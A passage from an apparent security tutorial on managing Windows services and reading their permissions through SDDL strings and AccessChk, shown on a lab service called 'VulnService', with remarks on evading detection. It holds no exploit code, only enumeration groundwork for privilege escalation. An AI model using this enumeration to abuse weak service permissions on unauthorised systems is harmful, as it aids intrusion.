</span></span><span class="line"><span class="cl"><span class="n">Out</span> <span class="n">Parameters</span><span class="err">:</span>
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="n">of</span> <span class="n">__PARAMETERS</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">ReturnValue</span> <span class="p">=</span> <span class="mf">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: This WMIC commands don&rsquo;t work well with PowerShell, they must be runned from a command-prompt.</p>
</blockquote>
<h2 id="managing-services-via-net">Managing Services via NET</h2>
<p>We can also use the net command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">stop</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">is</span> <span class="n">stopping</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">was</span> <span class="n">stopped</span> <span class="n">successfully</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">net</span> <span class="nb">start </span><span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">is</span> <span class="n">starting</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">was</span> <span class="n">started</span> <span class="n">successfully</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="managing-services-via-powershell">Managing Services via PowerShell</h2>
<p>CMD is old and modern attacks execute cmdlets in memory to avoid detection. We could also create custom cmdlets to be more stealthy, but that&rsquo;s beyond this article. I&rsquo;m gonna keep it simple and just demonstrate some cmdlets that we can use to manage services and nothing more.</p>
<p>The following cmdlets are in <strong>PowerShell 7.2 (LTS)</strong>.</p>
<p>Get help on service cmdlets:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-Help</span> <span class="p">*</span><span class="n">-Service</span>                                                                                                                                                                                                                                                                                                                                                                    <span class="nb">Resume-Service</span>                    <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Resume-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">Restart-Service</span>                   <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Restart-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">Set-Service</span>                       <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Set-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">Get-Service</span>                       <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Get-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">Suspend-Service</span>                   <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Suspend-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">Start-Service</span>                     <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Start-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">Stop-Service</span>                      <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">Stop-Service</span><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="nb">New-Service</span>                       <span class="n">Cmdlet</span>    <span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">M</span><span class="p">...</span> <span class="nb">New-Service</span><span class="p">...</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Find information about a service using its name:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Status</span>   <span class="n">Name</span>               <span class="n">DisplayName</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>   <span class="p">----</span>               <span class="p">-----------</span>
</span></span><span class="line"><span class="cl"><span class="n">Running</span>  <span class="n">VulnService</span>        <span class="n">VulnService</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Find information about a service using its display name:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-Service</span> <span class="n">-DisplayName</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Status</span>   <span class="n">Name</span>               <span class="n">DisplayName</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>   <span class="p">----</span>               <span class="p">-----------</span>
</span></span><span class="line"><span class="cl"><span class="n">Running</span>  <span class="n">VulnService</span>        <span class="n">VulnService</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Find information about services running on remote computers or workstations:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="n">-ComputerName</span> <span class="n">Server01</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: The ComputerName parameter accepts multiple values and wildcard characters, so you can get the services on multiple computers with a single command.</p>
</blockquote>
<p>The following cmdlet gets the services that the LanmanWorkstation service requires:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">LanmanWorkstation</span> <span class="n">-RequiredServices</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The following cmdlet gets the services that require the LanmanWorkstation service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">LanmanWorkstation</span> <span class="n">-DependentServices</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can even get all services that have dependencies. The following cmdlet does just that, and then it uses the Format-Table cmdlet to display the Status, Name, RequiredServices and DependentServices properties of the services on the computer:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="p">*</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="py">RequiredServices</span> <span class="o">-or</span> <span class="nv">$_</span><span class="p">.</span><span class="n">DependentServices</span><span class="p">}</span> <span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="nb">Format-Table</span> <span class="n">-Property</span> <span class="n">Status</span><span class="p">,</span> <span class="n">Name</span><span class="p">,</span> <span class="n">RequiredServices</span><span class="p">,</span> <span class="n">DependentServices</span> <span class="n">-auto</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can stop service with the following cmdlet:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Stop-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Status</span>   <span class="n">Name</span>               <span class="n">DisplayName</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>   <span class="p">----</span>               <span class="p">-----------</span>
</span></span><span class="line"><span class="cl"><span class="n">Stopped</span>  <span class="n">VulnService</span>        <span class="n">VulnService</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can start a service with the following cmdlet:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Start-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Status</span>   <span class="n">Name</span>               <span class="n">DisplayName</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>   <span class="p">----</span>               <span class="p">-----------</span>
</span></span><span class="line"><span class="cl"><span class="n">Running</span>  <span class="n">VulnService</span>        <span class="n">VulnService</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can suspend service with the following cmdlet (we didn&rsquo;t add suspend support):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Suspend-Service</span> <span class="n">-Name</span> <span class="p">&lt;</span><span class="n">name</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can restart a service with the following cmdlet:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Restart-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Status</span>   <span class="n">Name</span>               <span class="n">DisplayName</span>
</span></span><span class="line"><span class="cl"><span class="p">------</span>   <span class="p">----</span>               <span class="p">-----------</span>
</span></span><span class="line"><span class="cl"><span class="n">Running</span>  <span class="n">VulnService</span>        <span class="n">VulnService</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we are an administrator we could also set up service properties with the <code>Set-Service</code> cmdlet, this can be done on a local or remote computer. Additionally, we could change the startup type of the service with the <code>StartupType</code> parameter.</p>
<h1 id="services-permissions">Services Permissions</h1>
<p>Each service can have a set of permissions, just as file system objects and registry keys. Who can stop, query, change the startup type, edit the service configuration, or delete the service depending on its permission entries?</p>
<p>In this section, we’ll see how to view service permissions and modify them. There are many tools available to query and/or modify the service permissions. We&rsquo;ll see a few methods.</p>
<blockquote>
<p>Note: These are the <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener noreffer ">service security and access rights</a> in Windows.</p>
</blockquote>
<p>The permissions of a service is stored in this registry key, in a <code>REG_BINARY</code> value named <code>Security</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">HKEY_LOCAL_MACHINE</span><span class="p">\</span><span class="n">SYSTEM</span><span class="p">\</span><span class="n">CurrentControlSet</span><span class="p">\</span><span class="n">Services</span><span class="p">\[</span><span class="no">service_name</span><span class="p">]\</span><span class="n">Security</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="view-service-permissions">View service permissions</h2>
<p>We&rsquo;ll see a few methods that we can use to view service permissions.</p>
<h3 id="scexe">SC.exe</h3>
<p>We&rsquo;re gonna use a command prompt command line as <strong>administrator</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">sc</span><span class="p">.</span><span class="py">exe</span> <span class="n">sdshow</span> <span class="s2">&#34;VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">D:</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWRPWPDTLOCRRC</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLOCRRC</span><span class="p">;;;</span><span class="n">IU</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLOCRRC</span><span class="p">;;;</span><span class="n">SU</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>It returns an SDDL output called “security descriptors” that looks like the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">D:</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWRPWPDTLOCRRC</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLOCRRC</span><span class="p">;;;</span><span class="n">IU</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLOCRRC</span><span class="p">;;;</span><span class="n">SU</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The above output shows the <code>VulnService</code> service’s permission entries in Security Descriptor Definition Language (SDDL) format.</p>
<p><em>The SDDL output can contain either DACL or SACL entries. A DACL identifies users and groups who are allowed or denied access to an object. The SACL defines how access is audited on an object. SACL enables administrators to log attempts to access a secured object.</em></p>
<blockquote>
<p>Note: In this article, we&rsquo;ll only cover the DACL (denoted by the <code>D:</code> at the beginning.) SACL is for a different purpose and is out of the scope of this article.</p>
</blockquote>
<p>Here is a list of tables that describe the meaning of each security descriptor:</p>
<table>
  <thead>
      <tr>
          <th>D:</th>
          <th>Discretionary Access Control List (DACL)</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>S:</td>
          <td>System Access Control List (SACL)</td>
      </tr>
  </tbody>
</table>
<table>
  <thead>
      <tr>
          <th>ACE type</th>
          <th>Meaning</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>A</td>
          <td>Access Allowed</td>
      </tr>
  </tbody>
</table>
<table>
  <thead>
      <tr>
          <th>ACE flags string</th>
          <th>Meaning</th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>CC</td>
          <td>SERVICE_QUERY_CONFIG</td>
          <td>Query the SCM for the service configuration</td>
      </tr>
      <tr>
          <td>LC</td>
          <td>SERVICE_QUERY_STATUS</td>
          <td>Query the SCM the current status of the service</td>
      </tr>
      <tr>
          <td>SW</td>
          <td>SERVICE_ENUMERATE_DEPENDENTS</td>
          <td>List dependent services</td>
      </tr>
      <tr>
          <td>LO</td>
          <td>SERVICE_INTERROGATE</td>
          <td>Query the service its current status</td>
      </tr>
      <tr>
          <td>RC</td>
          <td>READ_CONTROL</td>
          <td>Query the security descriptor of the service</td>
      </tr>
      <tr>
          <td>RP</td>
          <td>SERVICE_START</td>
          <td>Start the service</td>
      </tr>
      <tr>
          <td>DT</td>
          <td>SERVICE_PAUSE_CONTINUE</td>
          <td>Pause/Resume the service</td>
      </tr>
      <tr>
          <td>CR</td>
          <td>SERVICE_USER_DEFINED_CONTROL</td>
          <td>Required to call the CreateService function to specify a user-defined control code</td>
      </tr>
      <tr>
          <td>WD</td>
          <td>WRITE_DAC</td>
          <td>Change the permissions of the service</td>
      </tr>
      <tr>
          <td>WO</td>
          <td>WRITE_OWNER</td>
          <td>Change the owner in the object’s security descriptor</td>
      </tr>
      <tr>
          <td>WP</td>
          <td>SERVICE_STOP</td>
          <td>Stop the service</td>
      </tr>
      <tr>
          <td>DC</td>
          <td>SERVICE_CHANGE_CONFIG</td>
          <td>Change service configuration</td>
      </tr>
      <tr>
          <td>SD</td>
          <td>DELETE</td>
          <td>The right to delete the service</td>
      </tr>
  </tbody>
</table>
<p><em>We can find more information at <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/ace-strings" target="_blank" rel="noopener noreffer ">ACE Strings</a> and <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener noreffer ">Service Security and Access Rights</a> at Microsoft Docs website.</em></p>
<p>The security principal issued with these rights is represented by the final two characters after the ACE strings.</p>
<table>
  <thead>
      <tr>
          <th>Abbreviation</th>
          <th>Security Principal</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>AU</td>
          <td>Authenticated Users</td>
      </tr>
      <tr>
          <td>BA</td>
          <td>Built-in administrators</td>
      </tr>
      <tr>
          <td>SY</td>
          <td>Local System</td>
      </tr>
      <tr>
          <td>BU</td>
          <td>Built-in users</td>
      </tr>
      <tr>
          <td>WD</td>
          <td>Everyone</td>
      </tr>
  </tbody>
</table>
<p>Let’s see what rights the “built-in administrators” group has, as per this SDDL.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">D:</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWRPWPDTLOCRRC</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)</span> <span class="c"># Full permissions</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLOCRRC</span><span class="p">;;;</span><span class="n">IU</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCLCSWLOCRRC</span><span class="p">;;;</span><span class="n">SU</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The <code>Built-in administrators</code> group has full permission:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">CCDCLCSWRPWPDTLOCRSDRCWDWO</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><table>
  <thead>
      <tr>
          <th>ACE flags string</th>
          <th></th>
          <th></th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>CC</td>
          <td>SERVICE_QUERY_CONFIG</td>
          <td>Query the SCM for the service configuration</td>
      </tr>
      <tr>
          <td>LC</td>
          <td>SERVICE_QUERY_STATUS</td>
          <td>Query the SCM the current status of the service</td>
      </tr>
      <tr>
          <td>SW</td>
          <td>SERVICE_ENUMERATE_DEPENDENTS</td>
          <td>List dependent services</td>
      </tr>
      <tr>
          <td>LO</td>
          <td>SERVICE_INTERROGATE</td>
          <td>Query the service its current status</td>
      </tr>
      <tr>
          <td>RC</td>
          <td>READ_CONTROL</td>
          <td>Query the security descriptor of the service</td>
      </tr>
      <tr>
          <td>RP</td>
          <td>SERVICE_START</td>
          <td>Start the service</td>
      </tr>
      <tr>
          <td>DT</td>
          <td>SERVICE_PAUSE_CONTINUE</td>
          <td>Pause/Resume the service</td>
      </tr>
      <tr>
          <td>CR</td>
          <td>SERVICE_USER_DEFINED_CONTROL</td>
          <td></td>
      </tr>
      <tr>
          <td>WD</td>
          <td>WRITE_DAC</td>
          <td>Change the permissions of the service</td>
      </tr>
      <tr>
          <td>WO</td>
          <td>WRITE_OWNER</td>
          <td>Change the ownership of the service</td>
      </tr>
      <tr>
          <td>WP</td>
          <td>SERVICE_STOP</td>
          <td>Stop the service</td>
      </tr>
      <tr>
          <td>DC</td>
          <td>SERVICE_CHANGE_CONFIG</td>
          <td>Change service configuration</td>
      </tr>
      <tr>
          <td>SD</td>
          <td>DELETE</td>
          <td>The right to delete the service</td>
      </tr>
  </tbody>
</table>
<p>As we can see, the <code>Built-in administrators</code> user has full permissions (<a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights" target="_blank" rel="noopener noreffer ">SERVICE_ALL_ACCESS</a>), and it can do anything with this service.</p>
<h3 id="sysinternals-accesschk">SysInternals AccessChk</h3>
<p>Query the service permissions using AccessChk, and run this command from an <strong>administrator</strong> command prompt:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-c</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">-l</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;ll see the following output:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-c</span> <span class="s2">&#34;VulnService&#34;</span> <span class="n">-l</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">  <span class="n">DESCRIPTOR</span> <span class="n">FLAGS</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">SE_DACL_PRESENT</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">SE_SACL_PRESENT</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">      <span class="p">[</span><span class="no">SE_SELF_RELATIVE</span><span class="p">]</span>
